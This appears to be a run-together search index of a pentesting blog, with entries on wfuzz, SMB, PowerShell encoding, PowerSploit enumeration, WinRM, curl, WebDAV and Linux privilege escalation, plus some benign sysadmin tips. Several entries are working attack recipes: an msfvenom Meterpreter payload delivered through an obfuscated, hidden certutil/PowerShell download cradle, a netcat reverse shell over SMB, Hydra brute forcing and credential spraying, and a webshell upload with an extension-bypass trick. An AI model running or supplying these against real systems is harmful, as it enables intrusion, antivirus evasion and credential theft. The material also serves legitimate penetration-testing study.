wfuzz scripts might be installed depending on version of kali.ls -l /usr/lib/python2.7/dist-packages/wfuzz/plugins/scripts/ls -ls /usr/share/wfuzz/plugins/scripts/We can see a list of scripts using the -e optionwfuzz -e scriptsRun default scripts (--script=default)wfuzz -c -z file,/usr/share/wfuzz/wordlist/general/big.txt --hc 404 http://website/FUZZRun multiple collections of scriptswfuzz -c -z file,/usr/share/wfuzz/wordlist/general/megabeast.txt --script=active,default,discovery --hc 404 http://website/FUZZTo get help on a script or script category.wfuzz --script-help=defaultwfuzz --script-help=wc_extractorSpecial CasesHeaders can also be fuzzed:wfuzz -z file,wordlist/general/common.txt -H \"User-Agent: FUZZ\" http://website/FUZZHTTP verbs fuzzing can be specified using the -X swith:wfuzz -z list,GET-HEAD-POST-TRACE-OPTIONS -X FUZZ http://website/FUZZ💡 Wfuzz can set an authentication header using the `–basic/ntlm/digest` command-line switches.a protected resource using Basic authentication can be fuzzed using the following command:wfuzz -z list,nonvalid-httpwatch –basic FUZZ:FUZZ http://website/FUZZFuzz id fields in URLswfuzz -z range,0-10 –hl 97 http://website/product.php?pid=FUZZ" }, { "title": "Working With SMB", "url": "/posts/working-smb/", "categories": "article", "tags": "hydra, mount, nmblookup", "date": "2022-05-21 00:00:00 +0100", "snippet": "Working with SMBWindowsWindows commands for working with our sharenet use \\\\10.1.1.99\\IPC$ /user:evilsmbnet view 10.1.1.99dir \\\\10.1.1.99\\evilsharecopy \\\\10.1.1.99\\evilshare\\29.jpg mypic.jpgAnonymo...", "content": "Working with SMBWindowsWindows commands for working with our sharenet use \\\\10.1.1.99\\IPC$ /user:evilsmbnet view 10.1.1.99dir \\\\10.1.1.99\\evilsharecopy \\\\10.1.1.99\\evilshare\\29.jpg mypic.jpgAnonymous shares can be viewed without authenticating to the IPC$ share.net view 10.1.1.99Mount a sharenet use Y \\\\10.1.1.99\\myshare /user:eviltestcd /d Y:\\dirExecuting files from SMB. Because of the way Windows treats UNC paths, it’s possible to just execute our binary directly from the SMB share without even needing to copy it over first. Just run the executable as if it were already local and the payload will fire:C:\\Users\\evilsaint\\Desktop&gt; \\\\10.1.1.254\\sharefolder\\payload.exeLinuxListing SMB shares with username and passwordsmbclient -L 10.1.1.99 -U username%passwordListing SMB Shares with anonymous connectionsmbclient -N -L 10.1.1.99Connecting to SMB Share with username and passwordsmbclient //10.1.1.99/myshare -U eviltest%evilpassConnecting to SMB Share without username and passwordsmbclient //10.1.1.99/myshareSMBSMB SharesList Shares of computers in DomainGet-NetComputer -DomainController 172.20.50.254 | Get-NetShareBruteforcing SMB with HydraComma seperated username and passwordshydra -v -V -C user-pass.txt 10.1.18.2 smbnot using comma separatedhydra -L users.txt -e ns 172.24.2.97 smbSMBNetBIOSFind all hosts responding to netbios, the q supresses the headersnbtscan -q 10.11.1.0\\24Look at more detail for a single host either by IP or hostnamenmblookup -A 10.50.1.254nmblookup -S DC01Crackmapexeccrackmapexec smb 10.50.1.0\\24NMAPRun all Nmap SMB Checksnmap -sS -p 445 -n --open --script=smb-vuln* &lt;ip&gt;Exploit vulnerabilities with metasploit Vulnerability Metasploit Module smb-vuln-ms06-025 exploit06_025_rasmans_reg smb-vuln-ms07-029 exploit07_029_msdns_zonename smb-vuln-ms08-067 exploit08_067_netapi smb-vuln-cve2009-3103 exploit09_050_smb2_negotiate_func_index smb-vuln-ms17-010 exploit17_010_eternalblue SMB login (spray credentials)msf &gt; use auxiliary/scanner/smb/smb_loginshow optionsverbose offset password to the obtained local admin passwordremove user as passEnum4linuxEnumerate SMBenum4linux -a -u Administrator -p Passw0rd! 10.50.1.15SMB ClientListing SMB shares with username and passwordsmbclient -L 10.1.1.99 -U username%passwordListing SMB Shares with anonymous connectionsmbclient -N -L 10.1.1.99Connecting to SMB Share with username and passwordsmbclient //10.1.1.99/myshare -U eviltest%evilpassConnecting to SMB Share without username and passwordsmbclient //10.1.1.99/myshareWe can use smbclient over proxychainsproxychains smbclient '//192.168.1.230/myshare' -U 'MARVEL.LAB\\Administrator%password123!'We can tar up files or folders with smbclientsmbclient //10.129.121.21/guest -Tc test.tar secret.txtsmbclient //10.129.121.21/guest -Tc test.tar /tmpMount ShareMount SMB Sharemount -t \\\\X.X.X.X\\c$ \\mnt\\remote\\ -o username=user,password=pass,rwTo get a shell back from an SMB share.logon \"\\=`nc 10.11.0.233 443 -e \\bin\\bash`\"SMBMapNot very stealthy but can execute a commandpython /usr/share/smbmap/smbmap.py -H 127.0.0.1 -u user -p pass -x 'net group \"domain admins\" \\domain'SMBTreeSMB Tree can map out all smb shares in the neighbourhood.smbtree" }, { "title": "PowerShell: In-Memory Injection Using CertUtil.exe", "url": "/posts/powershell-memory-injection-using-certutilexe/", "categories": "tutorial", "tags": "certutil, powershell", "date": "2022-05-18 00:00:00 +0100", "snippet": " PowerShell is still one of the easiest and best ways to gain a foothold, but at the same time, it is selling you out because it talks to AMSI as soon as it’s run. The beauty of this method is th...", "content": " PowerShell is still one of the easiest and best ways to gain a foothold, but at the same time, it is selling you out because it talks to AMSI as soon as it’s run. The beauty of this method is that Microsoft’s certutil does the network call out to your primary payload while appearing to be an innocent certificate file.Pre-Requisites Download Invoke-CradleCrafter from GitHub.Methodology First, we will create a base64 encoded PowerShell Meterpreter payload by performing the following:msfvenom -p windows/x64/meterpreter/reverse_https LHOST=&lt;YOUR IP HERE&gt; LPORT=443 -e cmd/powershell_base64 -f psh -o b64_pwsh.txt**Note** that the payload file’s extension could be anything as long as `certutil` can get at it and read its content. For example, an organization may have a policy (or IDS, content filter, etc.) that does not allow the downloading of scripts; however, they probably allow .txt files or even files with abnormal extensions. If you change it, make sure you compensate for that when setting the URL in `Invoke-CradleCrafter` Next, you will create a folder used to serve up web content. Place the PowerShell Meterpreter PowerShell script (b64_pwsh.txt) inside this folder. Next, we will use Invoke-CradleCrafter to obfuscate our certutil and PowerShell commands used to perform the in-memory injection. Drop into a PowerShell prompt on your Linux host by typing pwsh or powershell. Then cd into your Invoke-CradleCrafter directory.Import-Module .\\Invoke-CradleCrafter.psd1; Invoke-CradleCrafterInvoke-CradleCrafter&gt; SET URL http://10.10.10.10/b64_pwsh.txtInvoke-CradleCrafter&gt; MEMORYInvoke-CradleCrafter&gt; CERTUTIL Next, you will be presented with your obfuscation options. Select ALL by typing it on the command line and then typing 1 to execute.:::powershellInvoke-CradleCrafter&gt; ALLInvoke-CradleCrafter&gt; 1 Once generated, we now have a PowerShell cradle with obfuscation that can pull in our b64_pwsh.txt payload. We now want to put this into a text file such as output.txt for encoding. We will encode this file in base64 using the certutil to create a file called cert.cer which will end up on our web server next to the b64_pwsh.txt.certutil -encode output.txt cert.cet We can now use the following one-liner to pull our cert.cer certificate from our web server; the certificate gets decoded and saved to the disk as stager.ps1. The file stager.ps1 is then executed (this is the content of the cradle we made earlier with Invoke-CradleCrafter), and when it runs, it pulls the b64_pwsh.txt file down from the server and executes it to give us a Metasploit Meterpreter session.:::powershellpowershell.exe -Win hiddeN -Exec ByPasS add-content -path %APPDATA%\\cert.cer (New-Object Net.WebClient).DownloadString('http://10.10.10.10/cert.cer'); certutil -decode %APPDATA%\\cert.cer %APPDATA%\\stager.ps1 &amp; start /b cmd /c powershell.exe -Exec Bypass -NoExit -File %APPDATA%\\stager.ps1 &amp; start /b cmd /c del %APPDATA%\\cert.cer **NOTE** that the `cert.cer` file will be deleted by the script; however, you will need to remove the `stager.ps1` file manually." }, { "title": "Setting PowerShell Terminal Options", "url": "/posts/setting-powershell-terminal-options/", "categories": "article", "tags": "powershell", "date": "2022-05-16 00:00:00 +0100", "snippet": "Set PowerShell Terminal OptionsWe can set values within the terminal to customise how the terminal output is displayed, the title of the terminal window shown or how much buffer size to use. Using ...", "content": "Set PowerShell Terminal OptionsWe can set values within the terminal to customise how the terminal output is displayed, the title of the terminal window shown or how much buffer size to use. Using these values can be helpful for several things, such as distinguishing windows, staging the title for a report screenshot or improved recognition of terminal output. Screen BufferGet the current screen buffer.:::powershell$host.UI.RawUI.BufferSizeEnlarge the terminal screen buffer to capture more output:::powershell$host.UI.RawUI.BufferSize = New-Object System.Management.Automation.Host.Size(120,999)💡 Note that when you attempt to decrease the width to below the current width, you will be presented with an errorConsole Style (for quick identification).Set Console Title:::powershell$host.ui.RawUI.WindowTitle = \"Staged Window Title For Screenshot\"Set Console Colours:::powershell$Host.UI.RawUI.BackgroundColor = 'Black'$Host.UI.RawUI.ForegroundColor = 'Green'Set Window PositionFind out what the current window position is:::powershell$host.UI.RawUI.WindowPositionSet window position:::powershell$host.UI.RawUI.WindowPosition = New-Object System.Management.Automation.Host.Coordinates(0,160)" }, { "title": "PowerSploit", "url": "/posts/powersploit/", "categories": "article", "tags": "powershell, powersploit", "date": "2022-05-09 00:00:00 +0100", "snippet": "PowersploitDomain ControllersGet Domain ControllersGet-NetDomainController -Domain MARVEL.LABGet Domain Controllers via LDAP QueriesGet-NetDomainController -LdapGet Domain Controllers (Easy Read Fo...", "content": "PowersploitDomain ControllersGet Domain ControllersGet-NetDomainController -Domain MARVEL.LABGet Domain Controllers via LDAP QueriesGet-NetDomainController -LdapGet Domain Controllers (Easy Read Format)Get-NetDomainController | Select-Object -Property Name,OSVersion,IPAddress,Roles,SiteName | Format-Table -AutoSizeFind a Domain ControllerTest-Connection &lt;Domain Name&gt;Test-Connection MARVEL.LABList local admins on each Domain Controller.Get-NetDomainController -Domain MARVEL.LAB -DomainController DC01 | Get-NetLocalGroupAD UsersGet Users in Domain (Easy Read Format)Get-NetUser | Select-Object -Property name,samaccountname,badpwdcount,memberof,admincount,pwdlastset | Format-Table -AutoSizeExport All Users to CSVGet-NetUser | Select-Object -Property * | Export-Csv -Path C:\\enum\\csv-usersGet Details on a single user.Get-NetUser -UserName black.widowAD ComputersGet Computers Connected in DomainGet-NetComputerGet-NetComputer -FullDataGet-NetComputer -FullData | Select-Object -Property name,dnshostname,operatingsystem,adspath | Format-Table -AutoSizeAD ObjectsGet Domain SIDGet-DomainSIDGet AD ObjectsGet-ADOjectGet-ADOject -SamAccountName AdministratorSet AD Object fieldsSet-ADObject -SamAccountName Administrator -PropertyName countrycode -PropertyValue 99Set-ADObject -SamAccountName Administrator -PropertyName description -PropertyValue \"test this\"Group Policy Objects (GPO)Get Domain GPOGet-NetGPOGet Domain GPO (Easy Read Format)Get-NetGPO | Select-Object -Property displayname,whencreated,whenchanged,gpcfilesyspath | Format-Table -AutoSizeDiscover Local Admins &amp; Admin AccessGet Local Admins Accounts on machines across the domain.Invoke-EnumerateLocalAdminGet Local Admin Accounts on machines across the domain (Nice Formatting)Invoke-EnumerateLocalAdmin | Format-Table -Property ComputerName,AccountName,IsDomain,IsGroup,SID -AutoSizeOnly Show Domain Admins and local admin groupsInvoke-EnumerateLocalAdmin | Where-Object { $_.IsDomain -eq $true } | Format-Table -Property ComputerName,AccountName,IsDomain,IsGroup,SID -AutoSizeOnly Show Domain AdminsInvoke-EnumerateLocalAdmin -Threads 100 | Where-Object { $_.IsDomain -eq $true -and $_.IsGroup -eq $false } | Format-Table -Property ComputerName,AccountName,IsDomain,IsGroup,SID -AutoSizeFind machines on the domain where your credentials have admin access.Find-LocalAdminAccess -Threads 10Get Users logged on to a computer.Get-NetLoggedOn -ComputerName WRK3Get-NetComputer | Get-NetLoggedOn | Format-Table -Property ComputerName,wkui1_usernameDomain\\ForestGet DomainGet-NetDomain -Domain travel.co.ukGet Forest DetailsGet-NetForest -Forest travel.co.ukGet the inter-domain trusts.Get-NetDomainTrust -DomainController 172.20.50.254 -Domain travel.co.uk\\@todo: come back and try these out Get-NetForestTrust Get-NetForestDomain Invoke-MapDomainTrustGet the SubnetsGet-NetSubnet -Domain travel.co.uk -DomainController 172.20.50.254AD Trusts &amp; ForestsFind out if the domain is part of a forest.Get-NetDomainFind other domains which you have trust with using PowerviewInvoke-MapDomainTrustInvoke-MapDomainTrust | Export-CSV -NoTypeInformation trusts.csvGet users, groups and computers from each domain.# UsersGet-NetUser -Domain trains.travel.co.uk | Select-Object -Property samaccountnameGet-NetUser -Domain flights.travel.co.uk | Select-Object -Property samaccountnameGet-NetUser -Domain travel.co.uk | Select-Object -Property samaccountname# GroupsGet-NetGroup -Domain trains.travel.co.ukGet-NetGroup -Domain flights.travel.co.ukGet-NetGroup -Domain travel.co.uk# ComputersGet-NetComputer -Domain trains.travel.co.ukGet-NetComputer -Domain flights.travel.co.ukGet-NetComputer -Domain travel.co.uk" }, { "title": "WinRM PSRemoting", "url": "/posts/winrm-psremoting/", "categories": "article", "tags": "powershell, winrm", "date": "2022-05-08 00:00:00 +0100", "snippet": "WinRM PSRemotingThe system needs to have WinRM enabled before you can use it:Test if the service is listening:Test-WSMan -ComputerName TargetPCEnable via PSexecpsexec \\\\target -u PoorSysAdmin -p P...", "content": "WinRM PSRemotingThe system needs to have WinRM enabled before you can use it:Test if the service is listening:Test-WSMan -ComputerName TargetPCEnable via PSexecpsexec \\\\target -u PoorSysAdmin -p Passw0rd -h -d powershell.exe \"enable-psremoting -force\"Insert your stager hereInvoke-Command -ComputerName TargetPC -ScriptBlock { BlahBlah } -credential jdoeGet an interactive PSRemote Shell.$cred = Get-CredentialEnter-PSSession -ComputerName TargetPC -Credential $cred" }, { "title": "How to Fix: Virtualbox on Windows 11 Mouse Not Working Inside VM", "url": "/posts/fix-mouse-not-working-inside-virtualbox-windows-11/", "categories": "article", "tags": "virutalbox, vms, windows", "date": "2022-05-07 00:00:00 +0100", "snippet": "The problemMouse cannot be used inside a VirtualBox VM (guest) on Windows 11 (host).#How to fix itStep 1 - Make Sure Your VirtualBox is Version 6.1.28 or LaterThese later versions have been improve...", "content": "The problemMouse cannot be used inside a VirtualBox VM (guest) on Windows 11 (host).#How to fix itStep 1 - Make Sure Your VirtualBox is Version 6.1.28 or LaterThese later versions have been improved by Oracle to minimise compatibility issues with Hyper-V. You can check the version by opening the VirtualBox Manager and navigating to:Help &gt; About VirtualBox...The version is displayed here. If you are running a version older than 6.1.28, consider upgrading it.Step 2 - Change your Pointing Device settingsPower off each virtual machine that needs fixing.On VirtualBox manager, click one machine at a time. Navigate to:Machine &gt; Settings.Under the System tab, change Pointing Device from PS/2 Mouse to USB Tablet. Click OK to save the changes.Step 3 - Verify the fixPower on your machine as usual and wait for the machine to boot. Try to move your mouse inside the VM.If the fix has been successful, congratulations! Let us know in the comments below if you were able to fix your VirtualBox using our article.#Why this error occursThis is a mouse that connects to a PS/2 port:Even though the other option, “USB Tablet”, has the word “tablet” in it - it does not mean that it will only work on tablets.From the VirtualBox manual (Chapter 3.4.1):The default virtual pointing devices for older guests is the traditional PS/2 mouse. If set to USB tablet, VirtualBox reports to the virtual machine that a USB tablet device is present and communicates mouse events to the virtual machine through this device." }, { "title": "Linux Package Management", "url": "/posts/linux-package-management/", "categories": "article", "tags": "apt, dpkg, yum", "date": "2022-05-04 00:00:00 +0100", "snippet": "Linux Package ManagementSometimes when installing packages you need to know the version of the current distribution that you have.Output shows Debian version number.cat /etc/Debian_versionOutput sh...", "content": "Linux Package ManagementSometimes when installing packages you need to know the version of the current distribution that you have.Output shows Debian version number.cat /etc/Debian_versionOutput shows Ubuntu version number.cat /etc/*-releaseOutput shows Redhat / CentOS version number.cat /etc/redhat-releaseDebian Package ManagementThe sources list of all the reposcat /etc/apt/sources.listOr sometimescat /etc/apt/sources.list.d/official-package-repositories.listSearch the apt package manager cacheapt-cache search nginxUpdate the cacheapt-get updateShow cache information on the package.apt-cache show nginxShow some basic statisticsapt-cache statsRemove packages and config filesapt-get purgeautoclean - Erase old downloaded archive filesapt-get autocleanRemove automatically all unused packagesapt-get autoremoveList installed packages, shows version and package descriptiondpkg -lLists installed packages but no extra infodpkg --get-selectionsInstall a packagedpkg -i &lt;deb file&gt;Unable to lock the administration directory (/var/lib/dpkg/)Occasionally when this error occurs the following steps are normally sufficient to solveKill any running apt processesps -A | grep aptkill -9 processnumberDelete the lock filesrm /var/lib/dpkg/lockForce the packages to reconfiguredpkg --configure -aUpdate package source listapt-get updateRedhat / CentOS / RPM Based DistrosList all installed RPMs on an RPM based Linux distro.rpm -qaCheck installed RPM is patched against CVE, grep the output for CVE.rpm -q --changelog openvpnYUM CommandsPackage manager used by RPM based systems, you can pull some useful information about installed packages and or install additional tools.Update all RPM packages with YUM, also shows whats out of date.yum updateUpdate individual packages, in this example HTTPD (Apache).yum update httpdInstall a package using YUM.yum install packageExclude a package from being updates with YUM.yum --exclude=package kernel* updateRemove package with YUM.yum remove packageRemove package with YUM.yum erase packageLists info about yum package.yum list packageWhat a packages does, e.g Apache HTTPD Server.yum provides httpdShows package info, architecture, version etc.yum info httpdUse YUM to install local RPM, settles deps from repo.yum localinstall blah.rpmShows deps for a package.yum deplist packageList all installed packages.yum list installed | moreShow all YUM groups.yum grouplist | moreDevelopment Tools Install YUM group.yum groupinstall" }, { "title": "Linux: Nano Shortcuts", "url": "/posts/linux-nano-shortcuts/", "categories": "tutorial", "tags": "linux, nano", "date": "2022-05-02 00:00:00 +0100", "snippet": "NanoFilesRead fileCtrl-RSave fileCtrl-OClose fileCtrl-XCut and PasteStart marking textALT-ACut marked text or line.CTRL-KPaste textCTRL-UNavigate FileEnd of fileALT-/Beginning of lineCTRL-AEnd of l...", "content": "NanoFilesRead fileCtrl-RSave fileCtrl-OClose fileCtrl-XCut and PasteStart marking textALT-ACut marked text or line.CTRL-KPaste textCTRL-UNavigate FileEnd of fileALT-/Beginning of lineCTRL-AEnd of lineCTRL-EShow line numberCTRL-CGo to line numberCTRL-_Search FileFindCTRL-WFind nextALT-WSearch and replaceCTRL-\\More nano info at: http://www.nano-editor.org/docs.php" }, { "title": "Installing A GUI On Linux", "url": "/posts/installing-gui-linux/", "categories": "tutorial", "tags": "linux", "date": "2022-04-27 00:00:00 +0100", "snippet": "Installing a GUI on Debian or CentosOn DebianFirst, update your system.apt-get updateSelect your choice of package and installapt-get install &lt;package name&gt;# i.e.apt-get install gnomeapt-get ...", "content": "Installing a GUI on Debian or CentosOn DebianFirst, update your system.apt-get updateSelect your choice of package and installapt-get install &lt;package name&gt;# i.e.apt-get install gnomeapt-get install gnome-coreapt-get install kde-fullapt-get install kde-standardapt-get install mate-desktop-environmentOnce installed, you can startstartxTo enable it on boot.systemctl set-default graphical.targetEither add a non-root user to login withadduser evilsaintLogin As Rootif you need to login to the GUI by root for whatever reason (not recommended), then the below will work on GnomeEdit the following filenano /etc/gdm3/daemon.confUnderneath [security] you need to add an AllowRoot parameter like the following.[security]AllowRoot=trueEdit the following filenano /etc/pam.d/gdm-passwordMake sure this line is commented out.auth required pam_succeed_if.so user != root quiet_successOn systems with multiple desktops, you can chooseecho 'exec gnome-session' &gt; /home/gnomeuser/.xinitrcecho 'startkde' &gt; /home/kdeuser/.xinitrcUsually, if there is a reason for a GUI environment that isn’t Kali Linux then you might need security tools. Add the kali sources using Katoolin.apt-get install gitgit clone https://github.com/LionSec/katoolin.git &amp;&amp; cp katoolin/katoolin.py /usr/bin/katoolinchmod +x /usr/bin/katoolinkatoolin (Option 1 to add repos)apt-get updateapt-get upgradeapt-getapt-get install kali-linux-fullOn CentosDecide on Gnome or KDE and install using the yum package manageryum -y groups install \"GNOME Desktop\"yum -y groups install \"KDE Plasma Workspaces\"Once installed, you can startstartxTo enable it on boot.systemctl set-default graphical.targetAdd a non-root user to login withadduser evilsaint" }, { "title": "Creating SMB Servers", "url": "/posts/creating-smb-servers/", "categories": "article", "tags": "smb", "date": "2022-04-22 00:00:00 +0100", "snippet": "SMBCreate SMB ServersImpacketpython smbserver.py -username evilsmb -password evilpass -ip 10.1.1.99 evilshare /root/payloads/ Leaving -username and -password off of the command will create an anon...", "content": "SMBCreate SMB ServersImpacketpython smbserver.py -username evilsmb -password evilpass -ip 10.1.1.99 evilshare /root/payloads/ Leaving -username and -password off of the command will create an anonymous share.ManualBacking up the original smb.confcp /etc/samba/smb.conf /etc/samba/smb.conf.bkEmptying our config file and then edit it so we can add only the lines we needroot@evilsaint:/# &gt;/etc/samba/smb.confroot@evilsaint:/# nano /etc/samba/smb.confWe make the following changes to our smb.confcat /etc/samba/smb.conf[global] workgroup = MARVEL[myshare] comment = My Share For Sharing Files read only = no locking = no path = /root/Documents guest ok = no To create an smbuser, a normal user with the same name needs to be present on the system.We now need to add a user to access the smbserverroot@evilsaint:/# smbpasswd -a evilsaintNew SMB password:Retype new SMB password:Added user evilsaint.We can verify the user was created with pdbeditpdbedit -w -Levilsaint:1001:XXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXX:E9298AEE730720E27F879300509D911A:[U ]:LCT-5A89C279:We now restart the service.service smbd restart" }, { "title": "Encoding PowerShell", "url": "/posts/encoding-powershell/", "categories": "article", "tags": "encoding, powershell", "date": "2022-04-19 00:00:00 +0100", "snippet": "Encoding PowershellOne gotcha that typically catches people out is the fact that PowerShell command encoding requires you to convert to unicode characters first which are two bytes compared to ASCI...", "content": "Encoding PowershellOne gotcha that typically catches people out is the fact that PowerShell command encoding requires you to convert to unicode characters first which are two bytes compared to ASCII. I often see juniors comparing the Base64 generated by the below commands with that of an online base64 encoder and then question why their outputs differ.Compare this[System.Text.Encoding]::ASCII.GetBytes('A')With[System.Text.Encoding]::Unicode.GetBytes('A')The manual method of encoding Powershell with no external libraries$command = \"net use; dir 'C:\\Program Files\\';ipconfig;ping 8.8.8.8\"$bytes = [System.Text.Encoding]::Unicode.GetBytes($command)$encodedCommand = [Convert]::ToBase64String($bytes)powershell.exe -EncodedCommand $encodedCommandOut-EncodedCommand cmdlet from PowersploitOut-EncodedCommand -Path C:\\cmds.txt -NonInteractive -NoProfile -EncodedOutputInvoke-Encode cmdlet from NishangInvoke-Encode -DataToEncode c:\\data.txt -OutCommandInvoke-Encode \"net use; systeminfo\" -OutCommandInvoke-Encode $commands -OutCommandInvoke-Obfuscation cmdlet (https:.com-Obfuscation)Import-Module C:\\Powershell\\Invoke-Obfuscation\\Invoke-Obfuscation.psd1Invoke-ObfuscationSET SCRIPTBLOCK cmd 1; cmd 2; cmd3; cmd4SET SCRIPTBLOCK Get-WmiObject -Class Win32_OperatingSystem; systeminfo; Write-Host 'Finished'" }, { "title": "Curl For Pentesters", "url": "/posts/curl-pentesters/", "categories": "article", "tags": "", "date": "2022-04-19 00:00:00 +0100", "snippet": "CurlUploadingUploading a webshell to a WebDav servercurl --user &lt;user&gt;:&lt;pass&gt; -T /ftphome/mshell.php http://192.168.30.55/webdav/ --anyauthBreak down of Flags Flag Descr...", "content": "CurlUploadingUploading a webshell to a WebDav servercurl --user &lt;user&gt;:&lt;pass&gt; -T /ftphome/mshell.php http://192.168.30.55/webdav/ --anyauthBreak down of Flags Flag Description –anyauth Tells curl to figure out an authentication method by itself and use the most secure one the remote site claims to support. -T Upload-file -u, –user Specify User:Password credentials. HTTP MethodSpecify the method to use: POST, HEAD, PUT, GET, DELETEcurl -X &lt;Method&gt;Banner grabbing for websitesIncludes the headerscurl -i &lt;ip&gt;Includes headers and follows redirectscurl -i -L &lt;ip&gt;Viewing WebsitesLooking at a webpage from the shellcurl &lt;ip&gt; -s -L | html2text -width '99'robots.txt checkcurl &lt;ip&gt;/robots.txt -s | html2textGrep a page for all title and href tagscurl -s -L 10.11.1.71 | grep \"title\\|href\" | sed -e s/^[[:space:]]*//Flags Flag Description -i Include the HTTP header in the output. -o Output to a file -s for silent mode, better if you want to save it to file -L Follow redirects " }, { "title": "Setting Up A WebDav Server", "url": "/posts/setting-webdav-server/", "categories": "tutorial", "tags": "webdav", "date": "2022-04-12 00:00:00 +0100", "snippet": "Setting up a WebDav serverDebianInstall apache2root@vultr:~# apt-get install apache2Enable the appropriate modulesroot@vultr:~# a2enmod sslroot@vultr:~# a2enmod dav_fsroot@vultr:~# a2enmod davCreat...", "content": "Setting up a WebDav serverDebianInstall apache2root@vultr:~# apt-get install apache2Enable the appropriate modulesroot@vultr:~# a2enmod sslroot@vultr:~# a2enmod dav_fsroot@vultr:~# a2enmod davCreate an SSL certificatemkdir /etc/apache2/sslopenssl req $@ -new -x509 -days 365 -nodes -out /etc/apache2/ssl/apache.pem -keyout /etc/apache2/ssl/apache.pemchmod 600 /etc/apache2/ssl/apache.pemCreate a webdavroot@vultr:~# mkdir /var/www/webdavroot@vultr:~# chown www-data:www-data /var/www/webdavroot@vultr:~# htpasswd -c /etc/apache2/passwd.webdav evilsaintNew password:Re-type new password:Adding password for user evilsaintEdit the configuration fileroot@vultr:~# cat &lt;&lt;EOF | tee /etc/apache2/sites-available/webdav.conf&lt;VirtualHost *:443&gt; ServerAdmin user@host.com DocumentRoot /var/www/webdav ServerName mywebdav.lab DirectoryIndex disabled SSLEngine on SSLCertificateFile /etc/apache2/ssl/apache.pem Alias /webdav/ /var/www/webdav/ &lt;Location /webdav&gt; DAV On AuthType Basic AuthName \"webdav\" AuthUserFile /etc/apache2/passwd.webdav Require valid-user &lt;/Location&gt; ErrorLog /var/log/webdav-error.log CustomLog /var/log/webdav-access.log combined&lt;/VirtualHost&gt;EOFEnable the sitea2ensite webdavRestart the apache server/etc/init.d/apache2 reloadWe can now test with cadaver (see further info on this tool below)root@evilsaint:/pentesting/enum# cadaverdav:!&gt; open https://104.238.128.52/webdavWARNING: Untrusted server certificate presented for `myname':Certificate was issued to hostname `myname' rather than `104.238.128.52'This connection could have been intercepted.Issued to: myorg, Widget maker, MYCITY, MYSTATE, UKIssued by: myorg, Widget maker, MYCITY, MYSTATE, UKCertificate is valid from Mon, 19 Mar 2018 22:57:50 GMT to Tue, 19 Mar 2019 22:57:50 GMTDo you wish to accept the certificate? (y/n) yAuthentication required for webdav on server `104.238.128.52':Username: evilsaintPassword:dav:/webdav/&gt; lsListing collection `/webdav/': succeeded. *test.txt 0 Mar 19 23:31dav:/webdav/&gt; get test.txtDownloading `/webdav/test.txt' to test.txt: [.] succeeded.CadaverWe can use the tool Cadaver to interact with WebDAV servers.We can query our cadaver versioncadaver -VStart a cadaver connection to a webdav server.cadaver 10.11.1.229We can navigate directly into folders but we have to give a full web pathcadaver http://10.11.1.229/aspnet_clientUpload Malicious Image Via CurlTo avoid the image content validator, we will prepend a valid JPG image to our ASP scriptcat cat.jpg shell.asp &gt; evil.asp;.jpgcurl --upload-file \"evil.asp;.jpg\" http://XX.XX.XX.XX/evil.asp;.jpg%00" }, { "title": "Linux Privilege Escalation Commands", "url": "/posts/linux-privilege-escalation-commands/", "categories": "article", "tags": "enumeration, linux, priv-esc", "date": "2022-04-11 00:00:00 +0100", "snippet": "Linux EnumerationPrivilege escalation happens when one user acquires the system rights of another user. While not a direct exploit, enumeration is vital for finding ways of exploitation.Kernel, Ope...", "content": "Linux EnumerationPrivilege escalation happens when one user acquires the system rights of another user. While not a direct exploit, enumeration is vital for finding ways of exploitation.Kernel, Operating System &amp; Device InformationPrint all available system informationuname -aKernel releaseuname -rSystem hostnameuname -nAs abovehostnameLinux kernel architecture (32 or 64 bit)uname -mKernel informationcat /proc/versionDistribution informationcat /etc/*-releaseDistribution informationcat /etc/issueCPU informationcat /proc/cpuinfoFile system informationdf -aUsers &amp; GroupsList all users on the systemcat /etc/passwdAs abovegetent passwdList all groups on the systemcat /etc/groupList all uids and respective group membershipsfor i in $(cat /etc/passwd 2&gt;/dev/null| cut -d\":\" -f1 2&gt;/dev/null);do id $i;done 2&gt;/dev/nullShow user hashes - Privileged commandcat /etc/shadowList all superuser accountsgrep -v -E \"^#\" /etc/passwd | awk -F: '$3 == 0 { print $1}'Users currently logged infingerUsers currently logged inpinkyUsers currently logged inusersUsers currently logged inwho -aWho is currently logged in, and what they’re doingwListing of last logged on userslastInformation on when all users last logged inlastlogInformation on when the specified user last logged inlastlog -u %username%Entire list of previously logged on userslastlog |grep -v \"Never\"User &amp; Privilege InformationCurrent usernamewhoamiCurrent user informationidWho’s allowed to do what as root - Privileged commandcat /etc/sudoersCan the current user perform anything as rootsudo -lCan the current user run any â€˜interesting’ binaries as root and if so also display the binary permissions etc.sudo -l 2&gt;/dev/null | grep -w 'nmap|perl|'awk'|'find'|'bash'|'sh'|'man'|'more'|'less'|'vi'|'vim'|'nc'|'netcat'|python|ruby|lua|irb' | xargs -r ls -la 2&gt;/dev/nullEnvironmental InformationDisplay environmental variablesenvSet a run-time parametersetPath informationecho $PATH.Displays command history of current userhistoryPrint working directorypwdDisplay default system variablescat /etc/profileDisplay available shellscat /etc/shellsInteresting Filessetuid PermissionWhen set-user identification (setuid) permission is set on an executable file, a process that runs this file is granted access based on the owner of the file (this is usually root), rather than the user who is running the executable file. This special permission allows a user to access files and directories that are normally only available to the owner. For example, the setuid permission on the passwd command makes it possible for a user to change passwords, assuming the permissions of the root ID:setgid PermissionThe set-group identification (setgid) permission is similar to setuid, except that the process’s effective group ID (GID) is changed to the group owner of the file, and a user is granted access based on permissions granted to that group. The /usr/bin/mail command has setgid permissions:When setgid permission is applied to a directory, files that were created in this directory belong to the group to which the directory belongs, not the group to which the creating process belongs. Any user who has write and execute permissions in the directory can create a file there. However, the file belongs to the group that owns the directory, not to the user’s group ownership.Sticky BitThe sticky bit is a permission bit that protects the files within a directory. If the directory has the sticky bit set, a file can be deleted only by the owner of the file, the owner of the directory, or by root. This special permission prevents a user from deleting other users’ files from public directories such as /tmp:Examplefind directory -user root -perm -4000 -exec ls -ldb {} \\; &gt;/tmp/filenameBreakdownfind directory = Checks all mounted paths starting at the specified directory, which can be root (/), sys, bin, or mail.-user root = Displays files owned only by root.-perm -4000 = Displays files only with permissions set to 4000.-exec ls -ldb = Displays the output of the find command in ls -ldb format.&gt;/tmp/filename = Writes results to this file.Find SUID filesfind / -perm -4000 -type f 2&gt;/dev/nullFind SUID files owned by the root userfind / -uid 0 -perm -4000 -type f 2&gt; /dev/nullOr we can specify the user name instead of their user-idfind / -user root -perm -4000 -type f 